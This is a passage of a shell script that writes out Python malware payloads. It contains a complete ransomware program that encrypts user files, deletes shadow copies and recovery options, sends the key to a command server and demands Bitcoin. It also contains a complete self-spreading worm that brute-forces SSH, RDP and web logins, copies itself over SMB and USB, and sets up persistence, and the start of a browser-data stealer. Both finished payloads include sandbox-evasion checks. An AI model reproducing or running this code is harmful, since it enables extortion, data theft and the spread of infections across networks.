ENCRYPTED_EXTENSION = ".FIRE"
README_FILENAME = "README_FIRE.txt"
WALLPAPER_FILENAME = "fire_wallpaper.png"
KEY_EXFIL_URL = "http://example.com/api/key"  # This would be a real C2 server
PAYMENT_URL = "https://example.com/pay"
SUPPORT_EMAIL = "support@fire-ransomware.com"
BITCOIN_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

# Advanced logging
class RansomwareLogger:
    def __init__(self):
        self.logger = logging.getLogger('ransomware')
        self.logger.setLevel(logging.INFO)
        
        # Create log file in temp directory
        temp_dir = Path(tempfile.gettempdir())
        log_file = temp_dir / f"fire_log_{int(time.time())}.log"
        
        handler = logging.FileHandler(log_file)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    def info(self, message):
        self.logger.info(message)
    
    def error(self, message):
        self.logger.error(message)
    
    def warning(self, message):
        self.logger.warning(message)

logger = RansomwareLogger()

class AdvancedRansomware:
    def __init__(self):
        self.system_info = platform.system()
        self.username = os.environ.get('USER') or os.environ.get('USERNAME')
        self.encryption_key = self._generate_key()
        self.files_encrypted = 0
        self.total_size = 0
        self.start_time = time.time()
        self.stop_event = threading.Event()
        
    def _generate_key(self):
        """Generate encryption key"""
        return Fernet.generate_key()
    
    def _derive_key(self, password, salt):
        """Derive key from password"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        return base64.urlsafe_b64encode(kdf.derive(password))
    
    def _encrypt_file(self, file_path, key):
        """Encrypt a single file"""
        try:
            # Read file
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Skip if file is too small or already encrypted
            if len(file_data) < 1024 or file_path.name.endswith(ENCRYPTED_EXTENSION):
                return False
            
            # Encrypt data
            fernet = Fernet(key)
            encrypted_data = fernet.encrypt(file_data)
            
            # Write encrypted file
            encrypted_path = str(file_path) + ENCRYPTED_EXTENSION
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Securely delete original file
            self._secure_delete(file_path)
            
            return True
        except Exception as e:
            logger.error(f"Error encrypting {file_path}: {e}")
            return False
    
    def _secure_delete(self, file_path):
        """Securely delete file"""
        try:
            if self.system_info == "Windows":
                # Windows secure delete
                import ctypes
                handle = ctypes.windll.kernel32.CreateFileW(
                    str(file_path),
                    0x40000000,  # GENERIC_WRITE
                    0x3,         # FILE_SHARE_READ | FILE_SHARE_WRITE
                    None,
                    3,           # OPEN_EXISTING
                    0x80,        # FILE_FLAG_DELETE_ON_CLOSE
                    None
                )
                if handle != -1:
                    ctypes.windll.kernel32.CloseHandle(handle)
            else:
                # Linux secure delete
                with open(file_path, 'wb') as f:
                    f.write(os.urandom(file_path.stat().st_size))
                os.remove(file_path)
        except:
            # Fallback to regular delete
            try:
                os.remove(file_path)
            except:
                pass
    
    def _exfiltrate_key(self):
        """Send encryption key to C2 server"""
        try:
            import requests
            
            data = {
                "key": base64.b64encode(self.encryption_key).decode(),
                "hostname": platform.node(),
                "username": self.username,
                "timestamp": time.time()
            }
            
            response = requests.post(KEY_EXFIL_URL, json=data, timeout=10)
            if response.status_code == 200:
                logger.info("Key successfully exfiltrated")
                return True
            else:
                logger.warning(f"Failed to exfiltrate key: HTTP {response.status_code}")
                return False
        except Exception as e:
            logger.error(f"Error exfiltrating key: {e}")
            return False
    
    def _create_ransom_note(self):
        """Create comprehensive ransom note"""
        try:
            target_dir = Path.home()
            readme_path = target_dir / README_FILENAME
            
            # Calculate key hash for identification
            key_hash = hashlib.sha256(self.encryption_key).hexdigest()[:16]
            
            # Calculate encryption statistics
            elapsed_time = time.time() - self.start_time
            encryption_rate = self.files_encrypted / elapsed_time if elapsed_time > 0 else 0
            
            note_content = f"""
╔══════════════════════════════════════════════════════════════╗
║                      YOUR FILES ARE ENCRYPTED                ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  What happened to your files?                               ║
║  ──────────────────────────────────────────────────────────  ║
║  All your important files have been encrypted with          ║
║  military-grade AES-256 encryption.                         ║
║                                                              ║
║  Files encrypted: {self.files_encrypted:<46} ║
║  Total size: {self.total_size/1024/1024:.2f} MB{'':<37} ║
║  Encryption rate: {encryption_rate:.2f} files/sec{'':<30} ║
║                                                              ║
║  Can I recover my files?                                    ║
║  ──────────────────────────────────────────────────────────  ║
║  Yes, but you need the unique decryption key.               ║
║  Without this key, your files are permanently lost.         ║
║                                                              ║
║  How do I get my files back?                                ║
║  ──────────────────────────────────────────────────────────  ║
║  1. Send 0.1 BTC to: {BITCOIN_ADDRESS:<29} ║
║  2. Email transaction ID to: {SUPPORT_EMAIL:<26} ║
║  3. You will receive your decryption key within 24 hours    ║
║                                                              ║
║  Your personal ID: {key_hash:<38} ║
║                                                              ║
║  Payment deadline: 72 hours                                 ║
║  After deadline, price doubles to 0.2 BTC                   ║
║                                                              ║
║  WARNING:                                                   ║
║  ──────────────────────────────────────────────────────────  ║
║  • Do not attempt to decrypt files yourself                 ║
║  • Do not modify encrypted files                            ║
║  • Do not use third-party recovery tools                    ║
║  • Any attempt may result in permanent data loss            ║
║                                                              ║
║  Free decryption guarantee:                                 ║
║  ──────────────────────────────────────────────────────────  ║
║  We will decrypt 1 file for free (under 1MB)                ║
║  Send the file to {SUPPORT_EMAIL:<26} ║
║  with your ID in the subject line                           ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""
            
            with open(readme_path, 'w') as f:
                f.write(note_content)
            
            # Create ransom note on desktop
            desktop = target_dir / 'Desktop' if self.system_info == "Windows" else target_dir / 'Desktop'
            if desktop.exists():
                shutil.copy2(readme_path, desktop)
            
            logger.info(f"Created ransom note at {readme_path}")
            return True
        except Exception as e:
            logger.error(f"Error creating ransom note: {e}")
            return False
    
    def _create_wallpaper(self):
        """Create ransomware wallpaper"""
        try:
            from PIL import Image, ImageDraw, ImageFont
            
            # Create black image
            img = Image.new('RGB', (1920, 1080), color='black')
            draw = ImageDraw.Draw(img)
            
            # Add text
            title_text = "YOUR FILES ARE ENCRYPTED"
            subtitle_text = f"Send 0.1 BTC to {BITCOIN_ADDRESS}"
            id_text = f"ID: {hashlib.sha256(self.encryption_key).hexdigest()[:16]}"
            
            # Try to use system font
            try:
                if self.system_info == "Windows":
                    font_large = ImageFont.truetype("arial.ttf", 60)
                    font_medium = ImageFont.truetype("arial.ttf", 30)
                    font_small = ImageFont.truetype("arial.ttf", 20)
                else:
                    font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 60)
                    font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 30)
                    font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 20)
            except:
                font_large = ImageFont.load_default()
                font_medium = ImageFont.load_default()
                font_small = ImageFont.load_default()
            
            # Calculate text positions
            title_width = draw.textlength(title_text, font=font_large)
            title_x = (1920 - title_width) / 2
            title_y = 300
            
            subtitle_width = draw.textlength(subtitle_text, font=font_medium)
            subtitle_x = (1920 - subtitle_width) / 2
            subtitle_y = 500
            
            id_width = draw.textlength(id_text, font=font_small)
            id_x = (1920 - id_width) / 2
            id_y = 700
            
            # Draw text
            draw.text((title_x, title_y), title_text, fill='red', font=font_large)
            draw.text((subtitle_x, subtitle_y), subtitle_text, fill='white', font=font_medium)
            draw.text((id_x, id_y), id_text, fill='yellow', font=font_small)
            
            # Save wallpaper
            target_dir = Path.home()
            wallpaper_path = target_dir / WALLPAPER_FILENAME
            img.save(wallpaper_path)
            
            # Set as wallpaper
            if self.system_info == "Windows":
                import ctypes
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, str(wallpaper_path), 0)
            else:
                # Linux wallpaper setting (varies by desktop environment)
                desktop_session = os.environ.get('DESKTOP_SESSION', '').lower()
                if 'gnome' in desktop_session:
                    os.system(f'gsettings set org.gnome.desktop.background picture-uri file://{wallpaper_path}')
                elif 'kde' in desktop_session:
                    os.system(f'qdbus org.kde.plasmashell /PlasmaShell org.kde.PlasmaShell.evaluateScript "var allDesktops = desktops();for (i=0;i<allDesktops.length;i++) {{d = allDesktops[i];d.wallpaperPlugin = "org.kde.image";d.currentConfigGroup = Array("Wallpaper", "org.kde.image", "General");d.writeConfig("Image", "file://{wallpaper_path}")}}"')
            
            logger.info(f"Created and set wallpaper at {wallpaper_path}")
            return True
        except Exception as e:
            logger.error(f"Error creating wallpaper: {e}")
            return False
    
    def _scan_and_encrypt(self, target_dir, key):
        """Scan directory and encrypt files"""
        try:
            for root, _, files in os.walk(target_dir):
                if self.stop_event.is_set():
                    break
                
                for file in files:
                    if self.stop_event.is_set():
                        break
                    
                    file_path = Path(root) / file
                    
                    # Skip system directories and our own files
                    if any(sys_dir in str(file_path).lower() for sys_dir in 
                          ["system32", "windows", "program files", "library", "applications"]):
                        continue
                    
                    # Check file extension
                    if file_path.suffix.lower() in TARGET_EXTENSIONS and not file_path.name.endswith(ENCRYPTED_EXTENSION):
                        try:
                            # Get file size
                            file_size = file_path.stat().st_size
                            
                            # Encrypt file
                            if self._encrypt_file(file_path, key):
                                self.files_encrypted += 1
                                self.total_size += file_size
                                
                                # Log progress
                                if self.files_encrypted % 10 == 0:
                                    logger.info(f"Encrypted {self.files_encrypted} files ({self.total_size/1024/1024:.2f} MB)")
                        
                        except Exception as e:
                            logger.error(f"Error processing {file_path}: {e}")
                            continue
            
            return True
        except Exception as e:
            logger.error(f"Error scanning directory {target_dir}: {e}")
            return False
    
    def encrypt_files(self):
        """Main encryption function"""
        try:
            target_dir = Path.home()
            
            logger.info(f"Starting encryption process with key: {base64.b64encode(self.encryption_key).decode()}")
            
            # Start key exfiltration in background
            exfil_thread = threading.Thread(target=self._exfiltrate_key)
            exfil_thread.daemon = True
            exfil_thread.start()
            
            # Scan and encrypt files in multiple threads
            threads = []
            
            # Common user directories to encrypt
            user_dirs = [
                target_dir / 'Desktop',
                target_dir / 'Documents',
                target_dir / 'Downloads',
                target_dir / 'Pictures',
                target_dir / 'Videos',
                target_dir / 'Music',
                target_dir / 'OneDrive' if self.system_info == "Windows" else target_dir / 'Google Drive'
            ]
            
            # Filter existing directories
            user_dirs = [d for d in user_dirs if d.exists()]
            
            # Create encryption threads
            for directory in user_dirs:
                thread = threading.Thread(target=self._scan_and_encrypt, args=(directory, self.encryption_key))
                thread.daemon = True
                threads.append(thread)
                thread.start()
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            # Create ransom note and wallpaper
            self._create_ransom_note()
            self._create_wallpaper()
            
            # Log completion
            elapsed_time = time.time() - self.start_time
            total_mb = self.total_size / 1024 / 1024
            logger.info(f"Encryption complete. {self.files_encrypted} files ({total_mb:.2f} MB) in {elapsed_time:.2f} seconds")
            
            return True
        except Exception as e:
            logger.error(f"Error in encrypt_files: {e}")
            return False
    
    def _disable_recovery(self):
        """Disable system recovery options"""
        try:
            if self.system_info == "Windows":
                # Disable Windows Restore
                os.system('vssadmin delete shadows /all /quiet')
                
                # Disable automatic repair
                os.system('bcdedit /set {default} recoveryenabled No')
                os.system('bcdedit /set {default} bootstatuspolicy ignoreallfailures')
                
                # Delete shadow copies
                os.system('wmic shadowcopy delete')
                
            else:
                # Disable Linux recovery (if any)
                pass
            
            logger.info("System recovery options disabled")
            return True
        except Exception as e:
            logger.error(f"Error disabling recovery: {e}")
            return False
    
    def _kill_processes(self):
        """Kill processes that might interfere"""
        try:
            # Processes to kill
            kill_list = [
                'excel.exe', 'winword.exe', 'powerpnt.exe', 'outlook.exe',
                'firefox.exe', 'chrome.exe', 'iexplore.exe', 'msedge.exe',
                'photoshop.exe', 'gimp.exe', 'vlc.exe', 'wmplayer.exe'
            ]
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.info['name'].lower() in kill_list:
                        proc.kill()
                        logger.info(f"Killed process: {proc.info['name']}")
                except:
                    continue
            
            return True
        except Exception as e:
            logger.error(f"Error killing processes: {e}")
            return False
    
    def run(self):
        """Main execution function"""
        try:
            # Kill interfering processes
            self._kill_processes()
            
            # Disable recovery options
            self._disable_recovery()
            
            # Start encryption
            self.encrypt_files()
            
            return True
        except Exception as e:
            logger.error(f"Error in run: {e}")
            return False

# Anti-analysis techniques
def anti_analysis():
    """Check for analysis environment"""
    try:
        # Check for virtualization
        if platform.system() == "Linux":
            vm_indicators = ['/proc/vz', '/proc/xen', '/dev/virtio-ports', '/sys/class/dmi/id/product_name']
            for indicator in vm_indicators:
                if os.path.exists(indicator):
                    if 'vmware' in open(indicator).read().lower() or 'virtualbox' in open(indicator).read().lower():
                        return False
        
        # Check for debugging
        if platform.system() == "Windows":
            import winreg
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                if winreg.QueryValueEx(key, "SandboxieControl")[0]:
                    return False
            except:
                pass
        
        # Check for sandbox
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:
            return False
        
        return True
    except:
        return True

# Main execution
if __name__ == "__main__":
    # Anti-analysis check
    if not anti_analysis():
        sys.exit(1)
    
    # Initialize and run ransomware
    ransomware = AdvancedRansomware()
    ransomware.run()
EOP
            ;;
        4)  # Advanced Worm payload
            cat > "payload.py" << 'EOP'
import os, socket, subprocess, time, logging, platform, threading, json
import hashlib, base64, random, struct
import requests
import psutil
from pathlib import Path
from cryptography.fernet import Fernet

# Configuration
SCAN_THREADS = 50
EXPLOIT_THREADS = 20
COMMON_PORTS = [22, 23, 53, 80, 135, 139, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 27017]
REPORT_URL = "http://example.com/api/report"
WORM_ID = hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
SPREAD_INTERVAL = 300  # 5 minutes
MAX_SPREAD_ATTEMPTS = 100

# Advanced logging
class WormLogger:
    def __init__(self):
        self.logger = logging.getLogger('worm')
        self.logger.setLevel(logging.INFO)
        
        # Create log file in temp directory
        temp_dir = Path(tempfile.gettempdir())
        log_file = temp_dir / f"worm_log_{int(time.time())}.log"
        
        handler = logging.FileHandler(log_file)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
    
    def info(self, message):
        self.logger.info(message)
    
    def error(self, message):
        self.logger.error(message)
    
    def warning(self, message):
        self.logger.warning(message)

logger = WormLogger()

class AdvancedWorm:
    def __init__(self):
        self.system_info = platform.system()
        self.hostname = platform.node()
        self.worm_id = WORM_ID
        self.spread_count = 0
        self.infected_hosts = set()
        self.stop_event = threading.Event()
        
    def _get_local_ip(self):
        """Get the local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            logger.error(f"Error getting local IP: {e}")
            return "127.0.0.1"
    
    def _get_subnet(self):
        """Get the subnet from local IP"""
        try:
            ip = self._get_local_ip()
            return '.'.join(ip.split('.')[:-1])
        except Exception as e:
            logger.error(f"Error getting subnet: {e}")
            return "192.168.1"
    
    def _scan_port(self, host, port, timeout=1):
        """Scan a single port on a host"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def _scan_host(self, host, ports, results):
        """Scan all ports on a host"""
        try:
            open_ports = []
            for port in ports:
                if self._scan_port(host, port):
                    open_ports.append(port)
            
            if open_ports:
                results[host] = open_ports
                logger.info(f"[+] Found host: {host} with open ports: {open_ports}")
        except Exception as e:
            logger.error(f"Error scanning host {host}: {e}")
    
    def _scan_network(self):
        """Scan the network for vulnerable hosts"""
        try:
            subnet = self._get_subnet()
            logger.info(f"Scanning network: {subnet}.x")
            
            results = {}
            threads = []
            
            # Create thread pool for scanning
            for i in range(1, 255):
                ip = f"{subnet}.{i}"
                thread = threading.Thread(target=self._scan_host, args=(ip, COMMON_PORTS, results))
                thread.daemon = True
                threads.append(thread)
                
                # Limit concurrent threads
                if len(threads) >= SCAN_THREADS:
                    for t in threads:
                        t.start()
                    for t in threads:
                        t.join()
                    threads = []
            
            # Start remaining threads
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            
            # Report results
            self._report_scan_results(results)
            
            logger.info(f"Network scan complete. Found {len(results)} hosts with open ports.")
            return results
        except Exception as e:
            logger.error(f"Error in scan_network: {e}")
            return {}
    
    def _exploit_ssh(self, host, port):
        """Attempt SSH brute force"""
        try:
            # Common credentials
            credentials = [
                ('root', 'root'), ('root', 'password'), ('root', '123456'),
                ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
                ('user', 'user'), ('user', 'password'), ('ubuntu', 'ubuntu')
            ]
            
            for username, password in credentials:
                try:
                    # Try to connect with paramiko (if available) or subprocess
                    result = subprocess.run(
                        ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=5',
                         f'{username}@{host}', 'echo', 'test'],
                        capture_output=True,
                        timeout=10
                    )
                    
                    if result.returncode == 0:
                        logger.info(f"[+] SSH credentials found for {host}: {username}:{password}")
                        return self._spread_via_ssh(host, port, username, password)
                except:
                    continue
            
            return False
        except Exception as e:
            logger.error(f"Error in SSH exploit: {e}")
            return False
    
    def _exploit_smb(self, host, port):
        """Attempt SMB exploitation"""
        try:
            # Check for EternalBlue vulnerability (simplified)
            try:
                result = subprocess.run(
                    ['smbclient', '-L', f"//{host}", '-N'],
                    capture_output=True,
                    timeout=10
                )
                
                if result.returncode == 0:
                    logger.info(f"[+] SMB share accessible on {host}")
                    return self._spread_via_smb(host, port)
            except:
                pass
            
            return False
        except Exception as e:
            logger.error(f"Error in SMB exploit: {e}")
            return False
    
    def _exploit_rdp(self, host, port):
        """Attempt RDP brute force"""
        try:
            # Common RDP credentials
            credentials = [
                ('Administrator', 'password'), ('Administrator', '123456'),
                ('admin', 'password'), ('user', 'password')
            ]
            
            for username, password in credentials:
                try:
                    # Use xfreerdp or rdesktop
                    result = subprocess.run(
                        ['xfreerdp', '/u:' + username, '/p:' + password, '/v:' + host, '/cert-ignore'],
                        capture_output=True,
                        timeout=10
                    )
                    
                    if "Logon successful" in result.stderr.decode():
                        logger.info(f"[+] RDP credentials found for {host}: {username}:{password}")
                        return self._spread_via_rdp(host, port, username, password)
                except:
                    continue
            
            return False
        except Exception as e:
            logger.error(f"Error in RDP exploit: {e}")
            return False
    
    def _exploit_web(self, host, port):
        """Attempt web application exploitation"""
        try:
            # Check for common web vulnerabilities
            common_paths = ['/admin', '/login', '/wp-admin', '/phpmyadmin']
            
            for path in common_paths:
                try:
                    url = f"http://{host}:{port}{path}"
                    response = requests.get(url, timeout=5)
                    
                    if response.status_code == 200:
                        logger.info(f"[+] Found web path: {url}")
                        # Check for default credentials
                        if self._check_web_credentials(url):
                            return True
                except:
                    continue
            
            return False
        except Exception as e:
            logger.error(f"Error in web exploit: {e}")
            return False
    
    def _check_web_credentials(self, url):
        """Check for default web credentials"""
        try:
            # Common web credentials
            credentials = [
                ('admin', 'admin'), ('admin', 'password'), ('root', 'root'),
                ('admin', '123456'), ('test', 'test')
            ]
            
            for username, password in credentials:
                try:
                    # Try POST login
                    login_data = {'username': username, 'password': password}
                    response = requests.post(url, data=login_data, timeout=5)
                    
                    if "dashboard" in response.text.lower() or "welcome" in response.text.lower():
                        logger.info(f"[+] Web credentials found: {username}:{password}")
                        return True
                except:
                    continue
            
            return False
        except Exception as e:
            logger.error(f"Error checking web credentials: {e}")
            return False
    
    def _spread_via_ssh(self, host, port, username, password):
        """Spread worm via SSH"""
        try:
            # Create worm payload
            worm_payload = base64.b64encode(open(__file__, 'rb').read()).decode()
            
            # Transfer and execute on remote host
            commands = [
                f"echo '{worm_payload}' | base64 -d > /tmp/worm.py",
                "python3 /tmp/worm.py &",
                "rm -f /tmp/worm.py"
            ]
            
            for cmd in commands:
                subprocess.run(
                    ['sshpass', '-p', password, 'ssh', '-o', 'StrictHostKeyChecking=no',
                     f'{username}@{host}', cmd],
                    capture_output=True,
                    timeout=30
                )
            
            self.infected_hosts.add(host)
            self.spread_count += 1
            logger.info(f"[+] Successfully spread to {host} via SSH")
            return True
        except Exception as e:
            logger.error(f"Error spreading via SSH: {e}")
            return False
    
    def _spread_via_smb(self, host, port):
        """Spread worm via SMB shares"""
        try:
            # Try to access open shares
            shares = ['C$', 'ADMIN$', 'IPC$']
            
            for share in shares:
                try:
                    # Copy worm to share
                    worm_path = f"//{host}/{share}/Windows/worm.py"
                    subprocess.run(
                        ['smbclient', f"//{host}/{share}", '-N', '-c', 'put worm.py Windows/worm.py'],
                        capture_output=True,
                        timeout=10
                    )
                    
                    # Create scheduled task
                    task_cmd = f'schtasks /s {host} /create /tn "WindowsUpdate" /tr "python Windows\\worm.py" /sc onlogon /f'
                    subprocess.run(task_cmd, shell=True, check=False)
                    
                    self.infected_hosts.add(host)
                    self.spread_count += 1
                    logger.info(f"[+] Successfully spread to {host} via SMB")
                    return True
                except:
                    continue
            
            return False
        except Exception as e:
            logger.error(f"Error spreading via SMB: {e}")
            return False
    
    def _spread_via_rdp(self, host, port, username, password):
        """Spread worm via RDP"""
        try:
            # Create PowerShell script for execution
            ps_script = f'''
 $wormPayload = "{base64.b64encode(open(__file__, 'rb').read()).decode()}"
 $wormBytes = [System.Convert]::FromBase64String($wormPayload)
[System.IO.File]::WriteAllBytes("C:\\Windows\\Temp\\worm.py", $wormBytes)
Start-Process -FilePath "python" -ArgumentList "C:\\Windows\\Temp\\worm.py" -WindowStyle Hidden
Remove-Item "C:\\Windows\\Temp\\worm.py" -Force
'''
            
            # Execute via RDP
            subprocess.run(
                ['xfreerdp', '/u:' + username, '/p:' + password, '/v:' + host, '/cert-ignore',
                 '/app:||powershell', '/app-cmd:' + ps_script],
                capture_output=True,
                timeout=30
            )
            
            self.infected_hosts.add(host)
            self.spread_count += 1
            logger.info(f"[+] Successfully spread to {host} via RDP")
            return True
        except Exception as e:
            logger.error(f"Error spreading via RDP: {e}")
            return False
    
    def _exploit_host(self, host, port):
        """Attempt to exploit a host:port"""
        try:
            logger.info(f"[!] Attempting to exploit {host}:{port}")
            
            # Choose exploit based on port
            if port == 22:
                return self._exploit_ssh(host, port)
            elif port in [139, 445]:
                return self._exploit_smb(host, port)
            elif port == 3389:
                return self._exploit_rdp(host, port)
            elif port in [80, 8080, 8000, 8888]:
                return self._exploit_web(host, port)
            else:
                # Generic exploitation attempt
                logger.info(f"[!] No specific exploit for port {port}")
                return False
        except Exception as e:
            logger.error(f"Error exploiting host {host}:{port}: {e}")
            return False
    
    def _exploit_hosts(self, scan_results):
        """Exploit vulnerable hosts"""
        try:
            logger.info(f"Starting exploitation phase on {len(scan_results)} hosts")
            
            threads = []
            
            for host, ports in scan_results.items():
                if host in self.infected_hosts:
                    continue
                
                for port in ports:
                    if self.spread_count >= MAX_SPREAD_ATTEMPTS:
                        break
                    
                    thread = threading.Thread(target=self._exploit_host, args=(host, port))
                    thread.daemon = True
                    threads.append(thread)
                    
                    # Limit concurrent threads
                    if len(threads) >= EXPLOIT_THREADS:
                        for t in threads:
                            t.start()
                        for t in threads:
                            t.join()
                        threads = []
            
            # Start remaining threads
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            
            # Report results
            self._report_exploitation_results()
            
            logger.info(f"Exploitation complete. Infected {self.spread_count} hosts.")
            return True
        except Exception as e:
            logger.error(f"Error in exploit_hosts: {e}")
            return False
    
    def _report_scan_results(self, results):
        """Report scan results to C2 server"""
        try:
            data = {
                "type": "scan_results",
                "worm_id": self.worm_id,
                "source_ip": self._get_local_ip(),
                "timestamp": time.time(),
                "results": results
            }
            
            # Send to C2 server
            try:
                response = requests.post(REPORT_URL, json=data, timeout=10)
                if response.status_code == 200:
                    logger.info("Scan results reported successfully")
            except:
                logger.warning("Failed to report scan results")
            
            return True
        except Exception as e:
            logger.error(f"Error reporting scan results: {e}")
            return False
    
    def _report_exploitation_results(self):
        """Report exploitation results to C2 server"""
        try:
            data = {
                "type": "exploit_results",
                "worm_id": self.worm_id,
                "source_ip": self._get_local_ip(),
                "timestamp": time.time(),
                "infected_hosts": list(self.infected_hosts),
                "spread_count": self.spread_count
            }
            
            # Send to C2 server
            try:
                response = requests.post(REPORT_URL, json=data, timeout=10)
                if response.status_code == 200:
                    logger.info("Exploitation results reported successfully")
            except:
                logger.warning("Failed to report exploitation results")
            
            return True
        except Exception as e:
            logger.error(f"Error reporting exploitation results: {e}")
            return False
    
    def _persistence(self):
        """Establish persistence"""
        try:
            if self.system_info == "Windows":
                # Add to Windows registry
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
                
                # Add to scheduled tasks
                subprocess.run(
                    ['schtasks', '/create', '/tn', 'WindowsUpdate', '/tr', sys.executable,
                     '/sc', 'onlogon', '/f'],
                    check=False
                )
            else:
                # Add to crontab
                cron_cmd = f"@reboot {sys.executable} {os.path.abspath(__file__)} > /dev/null 2>&1"
                subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True, check=False)
            
            logger.info("Persistence established")
            return True
        except Exception as e:
            logger.error(f"Error establishing persistence: {e}")
            return False
    
    def _spread_to_removable_media(self):
        """Spread to removable media"""
        try:
            if self.system_info == "Windows":
                # Check for removable drives
                result = subprocess.run(['wmic', 'logicaldisk', 'get', 'deviceid,drivetype'],
                                      capture_output=True, text=True)
                
                for line in result.stdout.split('\n'):
                    if '2' in line:  # Removable drive
                        drive = line.split()[0]
                        worm_path = f"{drive}\\worm.exe"
                        
                        # Copy worm to drive
                        shutil.copy2(sys.executable, worm_path)
                        
                        # Create autorun.inf
                        autorun_content = f"[autorun]\nopen=worm.exe\nshell\\open\\command=worm.exe"
                        with open(f"{drive}\\autorun.inf", 'w') as f:
                            f.write(autorun_content)
            
            else:
                # Check for USB drives
                for mount in psutil.disk_partitions():
                    if 'usb' in mount.device.lower():
                        worm_path = f"{mount.mountpoint}/worm"
                        shutil.copy2(sys.executable, worm_path)
                        os.chmod(worm_path, 0o755)
            
            logger.info("Spread to removable media")
            return True
        except Exception as e:
            logger.error(f"Error spreading to removable media: {e}")
            return False
    
    def run(self):
        """Main worm execution loop"""
        try:
            # Establish persistence
            self._persistence()
            
            # Main spreading loop
            while not self.stop_event.is_set() and self.spread_count < MAX_SPREAD_ATTEMPTS:
                try:
                    # Scan network
                    scan_results = self._scan_network()
                    
                    if scan_results:
                        # Exploit hosts
                        self._exploit_hosts(scan_results)
                    
                    # Spread to removable media
                    self._spread_to_removable_media()
                    
                    # Wait before next spread attempt
                    time.sleep(SPREAD_INTERVAL)
                    
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    logger.error(f"Error in spreading loop: {e}")
                    time.sleep(60)
            
            logger.info(f"Worm execution complete. Infected {self.spread_count} hosts.")
            return True
        except Exception as e:
            logger.error(f"Error in run: {e}")
            return False

# Anti-analysis techniques
def anti_analysis():
    """Check for analysis environment"""
    try:
        # Check for virtualization
        if platform.system() == "Linux":
            vm_indicators = ['/proc/vz', '/proc/xen', '/dev/virtio-ports']
            for indicator in vm_indicators:
                if os.path.exists(indicator):
                    return False
        
        # Check for debugging
        debuggers = ['gdb', 'lldb', 'strace', 'ltrace']
        for debugger in debuggers:
            if subprocess.run(['pgrep', '-f', debugger], capture_output=True).returncode == 0:
                return False
        
        # Check for sandbox
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:
            return False
        
        return True
    except:
        return True

# Main execution
if __name__ == "__main__":
    # Anti-analysis check
    if not anti_analysis():
        sys.exit(1)
    
    # Initialize and run worm
    worm = AdvancedWorm()
    worm.run()
EOP
            ;;
        5)  # Advanced Info Stealer payload
            cat > "payload.py" << EOP
import os, glob, json, socket, base64, logging, platform, threading
import time, sqlite3, shutil, tempfile, hashlib
import requests
import psutil
from pathlib import Path
from cryptography.fernet import Fernet
import keyring
import winreg
import win32crypt
import win32security
import win32api
import win32con

# Configuration
ATTACKER_IP = '$attacker_ip'
ATTACKER_PORT = 8080
COLLECTION_DIR = tempfile.mkdtemp(prefix="fire_collected_")
ZIP_FILE = os.path.join(COLLECTION_DIR, "data.zip")
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
EXFIL_URL = "http://example.com/api/exfil"
BROWSER_PROFILES = {
    'chrome': {
        'windows': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default'),
        'linux': os.path.expanduser('~/.config/google-chrome/Default'),
        'mac': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default')
    },
    'firefox': {
        'windows': os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles'),
        'linux': os.path.expanduser('~/.mozilla/firefox'),
        'mac': os.path.expanduser('~/Library/Application Support/Firefox/Profiles')
    },
    'edge': {
        'windows': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default'),
        'linux': os.path.expanduser('~/.config/microsoft-edge/Default'),
        'mac': os.path.expanduser('~/Library/Application Support/Microsoft Edge/Default')
    }
}

# Advanced logging
class StealerLogger:
    def __init__(self):
        self.logger = logging.getLogger('stealer')
        self.logger.setLevel(logging.INFO)
        
        # Create log file in temp directory
        temp_dir = Path(tempfile.gettempdir())
